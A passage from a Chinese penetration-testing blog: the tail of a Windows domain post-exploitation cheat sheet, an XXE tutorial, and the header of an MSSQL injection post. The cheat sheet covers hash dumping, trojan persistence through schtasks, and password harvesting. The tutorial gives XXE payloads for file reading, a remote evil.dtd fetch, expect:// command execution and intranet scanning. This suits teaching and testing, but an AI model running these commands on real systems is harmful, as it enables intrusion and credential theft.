查询域列表</span><br><span class="line">net view /domain:testdomain       //查看 testdomain域中的计算机列表</span><br><span class="line">nltest /domain_trusts              //获取域信任信息</span><br><span class="line">net user domain-admin /domain      //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</span><br><span class="line">net config Workstation         //查询机器属于哪个域</span><br><span class="line">net time /domian               //查询主域服务器的时间</span><br><span class="line">echo %logonserver%              //查看登陆到这台服务器的计算机名</span><br><span class="line">net time  \\192.168.1.1         //查询远程共享主机192.168.1.1的时间</span><br><span class="line">net use \\IP\ipc$ password /user:username@domain     //ipc$域内连接</span><br><span class="line">net  view  \\dc2.backlion.com         //查看域控共享情况</span><br><span class="line">dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录</span><br><span class="line">xcopy \\dc2.backlion.com\sysvol.txt  sysvol.txt  /i  /e  /c //远程拷贝到本地sysvol日志</span><br><span class="line">net user  /domain  bk  bk123                 //修改域内用户密码，需要管理员权限</span><br><span class="line">net  localgroup  administartors   SEZKL\backlion  /add      //将SEZKL域中的用户backlion添加到administrators组中</span><br><span class="line">mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题</span><br><span class="line">gpupdate/force                  //更新域策略</span><br><span class="line">psexec  \\192.168.1.3  -u  administrator  -p  bk1234  -c  gsecdump.exe  -u</span><br><span class="line">  //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</span><br><span class="line">gsecdump  -a        //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</span><br><span class="line">tasklist /S ip /U domain\username /P /V     //查看远程计算机进程列</span><br></pre></td></tr></table></figure>
<h2 id="0x02-基本命令"><a href="#0x02-基本命令" class="headerlink" title="0x02 基本命令"></a>0x02 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all    //查看IP地址</span><br><span class="line">ipconfig /release  //释放地址</span><br><span class="line">ipconfig /renew 重新获取Ip地址</span><br><span class="line">whoami    //查询账号所属权限</span><br><span class="line">whoami/all  //查看sid值</span><br><span class="line">systeminfo  //查询系统以及补丁信息</span><br><span class="line">tasklist /svc   //查看进程</span><br><span class="line">taskkill /im 进程名称(cmd)  //结束进程</span><br><span class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">wmic qfe  get hotfixid    //查看已安装过得补丁，这个很实用</span><br><span class="line">wmic qfe list full /format:htable &gt; hotfixes.htm  //详细的补丁安装</span><br><span class="line">wmic  qfe      //查询补丁信息以及微软提供的下载地址</span><br><span class="line">ping hostname(主机名）   //显示该机器名的IP </span><br><span class="line">net start   //查看当前运行的服务</span><br><span class="line">net user      //查看本地组的用户</span><br><span class="line">net localhroup administrators   //查看本机管理员组有哪些用户</span><br><span class="line">net use      //查看会话</span><br><span class="line">net session     //查看当前会话</span><br><span class="line">net share       //查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path   //查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</span><br><span class="line">net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式）</span><br><span class="line">net use  z:  \\192.168.1.1      //建立映射到本机Z盘</span><br><span class="line">net time \\172.16.16.2        //查询共享主机的是</span><br><span class="line">at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行</span><br><span class="line">netstat  -ano      //查看开放的端口</span><br><span class="line">netstat -an | find “3389”   //找到3389端口</span><br><span class="line">net accounts      //查看本地密码策略</span><br><span class="line">nbtstat –A ip      //netbiso查询</span><br><span class="line">net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%         //查看系统是32还是64位  </span><br><span class="line">set                              //查看系统环境设置变量</span><br><span class="line">net start                     //查看当前运行的服务</span><br><span class="line">wmic service list brief              //查看进程服务</span><br><span class="line">wmic process list brief         //查看进程</span><br><span class="line">wmic startup list brief       //查看启动程序信息</span><br><span class="line">wmic product list brief            //查看安装程序和版本信息（漏洞利用线索）</span><br><span class="line">wmic startup list full         //识别开机启动的程序</span><br><span class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt; mysql.log  //获取软件安装路径</span><br><span class="line"></span><br><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br><span class="line"> //一键获取wifi密码</span><br><span class="line"></span><br><span class="line"> if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) </span><br><span class="line">//查看是否支持posershell</span><br><span class="line"></span><br><span class="line">qwinsta                       //查看登录情况</span><br><span class="line"></span><br><span class="line">schtasks.exe  /Create /RU &quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex    e&quot; /ED 2017/4/7  //添加计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f /q /a a.txt</span><br><span class="line"> //windows未打补丁情况</span><br><span class="line"></span><br><span class="line"> REG query HKCU  /v &quot;pwd&quot; /s  //获取保存到注册表中的密码</span><br></pre></td></tr></table></figure>
<h2 id="0x03-内网网络结构"><a href="#0x03-内网网络结构" class="headerlink" title=" 0x03 内网网络结构"></a> 0x03 内网网络结构</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> tracert IP    //路由跟踪</span><br><span class="line">route print    //打印路由表</span><br><span class="line">arp -a          //列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s （ip + mac）//绑定mac与ip地址</span><br><span class="line">arp -d （ip + mac） //解绑mac与ip地址</span><br><span class="line">nbtscan -r 192.168.16.0/24      //通过小工具nbtscan扫描整个网络</span><br><span class="line">netsh firewall show config     //查看防火墙策略</span><br><span class="line">netsh firewall show state     //查看防火墙策略</span><br><span class="line">for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;   //批量扫描内网存活主机</span><br><span class="line"></span><br><span class="line">windows自带端口转发：</span><br><span class="line">netsh interface ipv6 install  //首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22 connectaddress=1.1.1.1 connectport=22  //将本机22到1.1.1.1的22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=8.8.8.8 connectport=22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=www.baidu.com connectport=22</span><br><span class="line">netsh interface portproxy show all // 查看转发配置</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=22 //删除配置</span><br><span class="line">netsh firewall set portopening protocol=tcp port=22 name=Forward mode=enable scope=all profile=all  //添加防火墙规则，允许连接22：</span><br></pre></td></tr></table></figure>
<p>0x04 敏感数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir /b/s config.*              //查看所在目录所有config.为前缀的文件</span><br><span class="line">findstr /si password *.xml *.ini *.txt     //查看后缀名文件中含有password关键字的文件</span><br><span class="line">findstr /si login *.xml *.ini *.txt     //查看后缀名文件中含有login关键字的文件</span><br><span class="line">copy con 创建命令：</span><br><span class="line">copy con  ftp.bat     //创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</span><br><span class="line">copy con  test.vbs    //创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-常用快捷命令"><a href="#0x05-常用快捷命令" class="headerlink" title="0x05 常用快捷命令"></a>0x05 常用快捷命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mspaint　　画图工具</span><br><span class="line">calc　　计算机</span><br><span class="line">notepad　　记事本</span><br><span class="line">taskmgr　　任务管理器</span><br><span class="line">osk　　打开屏幕键盘</span><br><span class="line">gpedit.msc　　组策略</span><br><span class="line">services.msc　　本地服务</span><br><span class="line">compmgmt.msc　　计算机管理</span><br><span class="line">devmgmt.msc　　设备管理器</span><br><span class="line">winver　　查看系统版本</span><br><span class="line">magnify　　放大镜实用程序</span><br><span class="line">eventvwr　　事件查看器</span><br><span class="line">Regedit　　打开注册表</span><br><span class="line">resmon　　资源监视器</span><br><span class="line">WMIC BIOS get releasedate　　查看电脑生产日期</span><br><span class="line">mstsc -f　　远程连接（可以全屏）</span><br></pre></td></tr></table></figure>
<h2 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h2><p>其他更多命令和详细的用法说明，可以参考官方文档</p>
<p><a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf" target="_blank" rel="noopener">https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/浅谈XXE漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/03/浅谈XXE漏洞/" itemprop="url">
                  浅谈XXE漏洞
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T15:30:04+08:00">
                2018-05-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/03/浅谈XXE漏洞/" class="leancloud_visitors" data-flag-title="浅谈XXE漏洞">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-XML"><a href="#0x00-XML" class="headerlink" title="0x00 XML"></a>0x00 XML</h2><p>XML是可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言，与HTML的不同在于XML被设计用来传输和存储数据而HTML被设计用来显示数据。</p>
<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p>XML声明即是位于XML文档开始部分的第一行，规定了xml版本和编码格式。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br></pre></td></tr></table></figure></p>
<p>DTD(Document Type Definition) 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p>
<p>文档元素即下面例子中note中所有部分，每个xml文档必须包含一个根元素，下面的例子中根元素就是note<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x01-DTD-Document-Type-Definition"><a href="#0x01-DTD-Document-Type-Definition" class="headerlink" title="0x01 DTD(Document Type Definition)"></a>0x01 DTD(Document Type Definition)</h2><p>上面我们只是简要说了一下XML的结构，下来我们拿出我们重点关注的DTD文档类型定义来详细说明一下。</p>
<h4 id="DTD-引用方式"><a href="#DTD-引用方式" class="headerlink" title="DTD 引用方式"></a>DTD 引用方式</h4><ul>
<li><p>1.DTD 内部声明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>2.DTD 外部引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>3.引用公共DTD</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="DTD-实体声明"><a href="#DTD-实体声明" class="headerlink" title="DTD 实体声明"></a>DTD 实体声明</h4><ul>
<li>1.内部实体声明<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号</p>
<ul>
<li>2.外部实体声明<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>外部引用可支持http，file等协议，不同的语言支持的协议不同。</p>
<h2 id="0x02-XXE-XML-External-Entity-attack"><a href="#0x02-XXE-XML-External-Entity-attack" class="headerlink" title="0x02 XXE(XML External Entity attack)"></a>0x02 XXE(XML External Entity attack)</h2><p>XML外部实体注入，简称XXE。XXE使攻击者能够从服务器或连接网络泄露正常受保护的文件。</p>
<p>有了XML实体，关键字‘SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。</p>
<p>简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。</p>
<h2 id="0x03-XXE环境搭建"><a href="#0x03-XXE环境搭建" class="headerlink" title="0x03 XXE环境搭建"></a>0x03 XXE环境搭建</h2><p>我们新建一个存在xxe漏洞的index.php，写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=simplexml_load_string($_POST[&apos;xml&apos;]);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>我们尝试一个正常使用的例子，在firefox的hackbar插件中传入数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xml=&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以得到回显：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xxe01.jpg" alt=""></p>
<p>此时，我们的环境搭建完成。</p>
<h2 id="0x04-恶意代码的利用方式"><a href="#0x04-恶意代码的利用方式" class="headerlink" title="0x04 恶意代码的利用方式"></a>0x04 恶意代码的利用方式</h2><p>我们上面已经说过引用实体的方式，我们这里可以采用这几种方式在hackbar的post中写入恶意代码：</p>
<ul>
<li><p>1直接使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>2调用远程dtd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;http://xxxx.com/xxx.dtd&quot;&gt;</span><br><span class="line">]</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>在xxxx.com的xxx.dtd中写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>3无回显时发送给远程服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">                &lt;!ENTITY % f SYSTEM &quot;http://www.hack.com/evil.dtd&quot;&gt;</span><br><span class="line">                 %f;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;b;&lt;/a&gt;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>其中远程服务器中evil.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-xxe攻击方式"><a href="#0x05-xxe攻击方式" class="headerlink" title="0x05 xxe攻击方式"></a>0x05 xxe攻击方式</h2><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>通过file协议任意读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>通过expect协议进行命令执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><p>通过simplexml_load_string函数访问内网ip和端口进行扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.226:81&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.226:80&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h4><p>通过simplexml_load_string函数中带有恶意代码的url对内网网站进行攻击，直接在内网url的get参数中提交payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.226:80/test/xxxx.php?xxxxx&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x06-应对"><a href="#0x06-应对" class="headerlink" title="0x06 应对"></a>0x06 应对</h2><ul>
<li>1.禁用外部实体</li>
<li>2.过滤用户提交的xml信息</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/MSSQL注入总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/03/MSSQL注入总结/" itemprop="url">
                  MSSQL注入总结
                </a>
              
